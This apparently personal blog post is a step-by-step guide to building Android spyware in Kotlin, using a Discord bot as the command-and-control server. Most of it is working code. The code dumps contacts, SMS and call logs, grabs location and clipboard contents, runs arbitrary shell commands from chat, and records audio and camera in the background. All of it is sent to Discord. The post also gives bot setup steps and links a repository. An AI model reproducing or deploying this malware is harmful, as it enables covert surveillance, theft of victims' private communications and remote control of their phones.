---
date: '2025-04-21T21:14:45+08:00'
title: 'Android Spyware Development'
tags:
    - Android
    - guide
---

## Prerequisite

- Android Studio
- kotlin
- Android Emulator or physical devices
- Discord as C2

I tested out this project in API 33 rooted device. Anything above API 33 might need to perform some modification to get everything works.

## Creating the spyware

I created this project using Android Studio and Kotlin. This project took me around 16 hours to complete with massive help of GPT.

### Part 0
I started off by creating a project in Android Studio by pressing `New Project > Empty Activity` and provide a name. It will have some generated code and function.

### Part 1

Here's the part where I started to create a function that request for all the required permission. Starting with `AndroidManifest.xml`, I will need to declare the required permission first.

```xml
<uses-permission android:name="android.permission.READ_CONTACTS" />
<uses-permission android:name="android.permission.READ_CALL_LOG" />
<uses-permission android:name="android.permission.READ_SMS" />
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
<uses-permission android:name="android.permission.RECORD_AUDIO" />
<uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
<uses-permission android:name="android.permission.CAMERA" />
<uses-permission android:name="android.permission.INTERNET" />

<uses-feature
    android:name="android.hardware.telephony"
    android:required="false" />
<uses-feature
    android:name="android.hardware.camera"
    android:required="false" />
```

The permission here are required to read contacts, call log, SMS, GPS, recording audio, getting access to camera and Internet permission. Some of the permission are considered as "dangerous" which the app need to request the permission from user. Here's a function to get permission from user.

```kotlin
@Composable
fun RequestPermissionsAndExitIfDenied(context: Context) {
    val permissions = listOf(
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_SMS,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.CAMERA
    )
    var allGranted by remember {
        mutableStateOf(
            permissions.all {
                ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED
            }
        )
    }

    val launcher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.RequestMultiplePermissions()
    ) { result ->
        val permissionStatusLog = buildString {
            result.forEach { (permission, isGranted) ->
                val status = if (isGranted) "GRANTED" else "DENIED"
                append("Permission: $permission -> $status\n")
            }
        }
        allGranted = result.all { it.value }

    }

    LaunchedEffect(Unit) {
        if (!allGranted) {
            launcher.launch(permissions.toTypedArray())
        }
    }
}
```

### Part 2

Here's the part where I created a new kotlin class thats works with Discord as C2. The class uses `WebSocketClient` which is something that I need to add in `build.gradle.kts`.


```txt
implementation("org.java-websocket:Java-WebSocket:1.5.2")
```

After adding this, sync the project again and it is possible to use the `WebSocketClient` now. There are 3 function in the class that I will discuss here is the `onMessage` and `sendMessage` and `sendDiscordFileMessage`.

```kotlin
override fun onMessage(message: String?) {
    message?.let {
        try {
            val jsonMessage = JSONObject(it)

            // Update lastSequenceNumber if present
            if (!jsonMessage.isNull("s")) {
                lastSequenceNumber = jsonMessage.getInt("s")
            }

            // Listen for the GUILD_CREATE event to get the channel ID dynamically
            if (jsonMessage.getInt("op") == 0 && jsonMessage.optString("t") == "GUILD_CREATE") {
                val event = jsonMessage.getJSONObject("d")
                val channels = event.getJSONArray("channels")

                // Find the first text channel (type == 0) and get the channel ID
                for (i in 0 until channels.length()) {
                    val channel = channels.getJSONObject(i)
                    if (channel.getInt("type") == 0) { // 0 is a text channel
                        channelId = channel.getString("id")
                        println("Channel ID: $channelId")
                        onChannelIdReceived?.invoke(channelId!!)
                        break
                    }
                }
            }

            // Process MESSAGE_CREATE events
            if (jsonMessage.getInt("op") == 0 && jsonMessage.optString("t") == "MESSAGE_CREATE") {
                val event = jsonMessage.getJSONObject("d")
                val content = event.getString("content")

                // Trigger the callback if defined
                onMessageReceived?.invoke(content)
            }
        } catch (e: Exception) {
            println("Error parsing message: ${e.message}")
        }
    }
}
```

`OnMessage` is a function from `WebSocketClient` so I will need to override it. This basically get the message from Discord server and return it in the `onMessageReceived?.invoke(content)`.

```kotlin
fun sendMessage(title: String,content: String) {
    val id = channelId
    if (id == null) {
        println("Channel ID is not set. Cannot send message.")
        return
    }

    // Define the URL to send the message
    val url = URL("https://discord.com/api/v9/channels/$id/messages")

    // Prepare the JSON payload to send the message
    val json = JSONObject().apply {
        put("content", "$title\n```\n$content\n```")
    }

    // Perform HTTP POST request asynchronously
    GlobalScope.launch(Dispatchers.IO) {
        try {
            // Set up the connection
            val connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "POST"
            connection.setRequestProperty("Authorization", "Bot $token") // Set the Authorization header with the bot token
            connection.setRequestProperty("Content-Type", "application/json")
            connection.doOutput = true

            // Write the message content to the output stream
            withContext(Dispatchers.IO) {
                val os: OutputStream = connection.outputStream
                os.write(json.toString().toByteArray())
                os.flush()
            }

            // Get the response code
            val responseCode = connection.responseCode
            if (responseCode == HttpURLConnection.HTTP_OK) {
                println("Message sent successfully!")
            } else {
                println("Failed to send message. Response Code: $responseCode")
            }
            connection.disconnect()

        } catch (e: Exception) {
            println("Error sending message: ${e.message}")
        }
    }
}
```

Moving on to `sendMessage` and `sendDiscordFileMessage`, both the function basically send message and files to the discord server as the bot. There are other functions which is important to start and maintain the discord bot in order to interact with it.

### Part 3

Here's the part where I started to code the function to perform the spyware.

```kotlin
fun Dump(context: Context,client: DiscordWebSocketClient,contentUri: Uri, logTag: String) {
    context.contentResolver.query(contentUri, null, null, null, null)?.use { cursor ->
        if (cursor.moveToFirst()) {
            do {
                val line = buildString {
                    for (i in 0 until cursor.columnCount) {
                        if (i > 0) append(", ")
                        append(cursor.getString(i))
                    }
                }
                Log.i(logTag, line)
                client.sendMessage(logTag, line)

            } while (cursor.moveToNext())
        }
    }
}
```

This is `Dump` function where it is used to dump all information that I could get from content provider such as contact, SMS and call logs.

```kotlin
fun getLastKnownLocation(context: Context,client: DiscordWebSocketClient) {
    val fusedLocationClient: FusedLocationProviderClient =
        LocationServices.getFusedLocationProviderClient(context)

    try {
        fusedLocationClient.lastLocation
            .addOnSuccessListener { location ->
                if (location != null) {
                    Log.i("Location", "Lat: ${location.latitude}, Lon: ${location.longitude}")
                    val location = "Lat: ${location.latitude}, Lon: ${location.longitude}"
                    client.sendMessage("Location", location)
                } else {
                    Log.i("Location", "Location not available")
                }
            }
            .addOnFailureListener { e ->
                Log.i("Location", "Error getting last known location", e)
            }
    } catch (e: SecurityException) {
        Log.e("Location", "Location permission not granted", e)
    }
}
```

```txt
implementation("com.google.android.gms:play-services-location:21.3.0")
```
this is `getLastKnownLocation` function where it will get the location of the device. To get precise location, I need to add another dependency in `build.gradle.kts`. 

```kotlin
fun readClipboard(context: Context,client: DiscordWebSocketClient) {
    val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager

    if (clipboard.hasPrimaryClip()) {
        val clipData = clipboard.primaryClip
        val item = clipData?.getItemAt(0)
        val text = item?.coerceToText(context.applicationContext)

        if (!text.isNullOrEmpty()) {
            Log.i("Clipboard", "Clipboard content: $text")
            client.sendMessage("Clipboard", "Clipboard content: $text")
        } else {
            Log.i("Clipboard", "Clipboard is empty or non-text")
        }
    } else {
        Log.e("Clipboard", "No clipboard content available")
    }
}
```

This `readClipboard` function basically read the clipboard message. 

```kotlin
fun execute(command: String, client: DiscordWebSocketClient) {
    try {
        // Use a shell to support piping and redirection
        val processBuilder = ProcessBuilder("/system/bin/sh", "-c", command)
        processBuilder.redirectErrorStream(true)

        val process = processBuilder.start()
        val output = BufferedReader(InputStreamReader(process.inputStream)).use { it.readText() }

        process.waitFor()

        // Limit message size for Discord
        val limitedOutput = if (output.length > 1900) output.take(1900) + "\n[truncated]" else output

        client.sendMessage("Command Executed: $command", limitedOutput)
        Log.i("Command", "Executed: $command\n$limitedOutput")
    } catch (e: Exception) {
        client.sendMessage("Execution Error", e.message.toString())
        Log.e("Command", "Error executing command: ${e.message}", e)
    }
}
```

This `execute` function is for executing system command. Then there's also `AudioRecording` and `CamRecording` which is a service in order to perform the audio and camera recording in background. All of these function will send the output to discord via the discord bot. 

### Part 4

This part will focus on MainActivity's `onCreate` function where the application will host the discord bot and provide a list of available command to trigger the function.

```kotlin
if (DiscordClientManager.discordClient == null) {
    DiscordClientManager.discordClient = DiscordWebSocketClient()
}
DiscordClientManager.discordClient?.onChannelIdReceived = {
    DiscordClientManager.discordClient?.sendMessage("> App started",helpMsg)

}
DiscordClientManager.discordClient?.onMessageReceived = { message ->
    // Here, you can handle any messages that come from Discord
    println("Message received: $message")
    val command = message.trim()
    // Split the message into command and argument (everything after >cmd)
    val (baseCommand, argument) = if (command.startsWith(">cmd")) {
        command.split(" ", limit = 2).let {
            it.getOrElse(0) { "" } to it.getOrElse(1) { "" }
        }
    } else {
        command to ""
    }

    when (baseCommand) {
        ">help" -> DiscordClientManager.discordClient?.sendMessage("> Help Menu",helpMsg)
        ">Read Contact" -> Dump(this,DiscordClientManager.discordClient!! ,ContactsContract.CommonDataKinds.Phone.CONTENT_URI, "Contacts")
        ">Read Call Log" -> Dump(this,DiscordClientManager.discordClient!! ,CallLog.Calls.CONTENT_URI, "Call log")
        ">Read SMS" -> Dump(this,DiscordClientManager.discordClient!! ,Telephony.Sms.CONTENT_URI, "SMS")
        ">Get Location" -> getLastKnownLocation(this,DiscordClientManager.discordClient!!)
        ">Get Clipboard" -> readClipboard(this,DiscordClientManager.discordClient!!)
        ">cmd" -> {
            if (argument.isNotEmpty()) {
                // Here, argument is everything after ">cmd", e.g. "ls -la /var/www/html"
                execute(argument, DiscordClientManager.discordClient!!)
            } else {
                DiscordClientManager.discordClient?.sendMessage("Command Error",">cmd <command>")
            }
        }
        ">Record Audio" -> ContextCompat.startForegroundService(this, Intent(this, AudioRecording::class.java))
        ">Record Front Cam" -> ContextCompat.startForegroundService(this, Intent(this, CamRecording::class.java).apply {putExtra("cameraId", "1")})
        ">Record Back Cam" -> ContextCompat.startForegroundService(this, Intent(this, CamRecording::class.java).apply {putExtra("cameraId", "0")})
    }


}
DiscordClientManager.discordClient?.start()
```

This code basically get the message from `onMessageReceived` function and then it will trigger the function accordingly.

```kotlin
RequestPermissionsAndExitIfDenied(this@MainActivity)
Text("it works",
    modifier = Modifier.padding(innerPadding)
)
```

The remaining part of the `onCreate` function is just requesting the permission and writing a dummy text. 

### Part 5

This is the part where I need to create one discord bot and also a discord server with the bot in it. 

- Step 1: Go to [https://discord.com/developers/applications](https://discord.com/developers/applications)
- Step 2: Go to Applications and press New Application button and give it a random name.
- Step 3: Go to OAuth2 and tick bot under `OAuth2 URL Generator` and tick administrator in bot permission.
  - it will create a URL that looks like `https://discord.com/oauth2/authorize?client_id=<cliend_id>&permissions=8&integration_type=0&scope=bot`
- Step 4: Go to Bot and enable Presence Intent, Server Members Intent and Message Content Intent.
- Step 5: Create a discord server and add your newly created bot by accessing the generated URL. 
- Step 6: Copy the bot token (Press Reset Token to generate a new token if you dont see your token) and add it into the kotlin code. 

If everything works as intended, you will see a bot added into the server. Make sure to add the bot token into the code to allow the discord bot to be enabled. 

## Testing out

I tested the application on my rooted device API 33. When the application open for the first time, it will ask for the permission.

![alt text](img/index.png#center)

In my discord server, it will tell me that the app has started and send me a list of permission that is granted or not. 

![alt text](img/index-1.png#center)

Then I could just perform any command that to get the information that I want.

![alt text](img/index-2.png#center)

## Conclusion

This is just a random project that I decided to code to learn more about spyware. I used Discord as C2 because I dont want to host a server. There are some limitation in this project such as the application must be opened to trigger the command in discord. 

## Repo

- [https://github.com/callmeks/spyware](https://github.com/callmeks/spyware)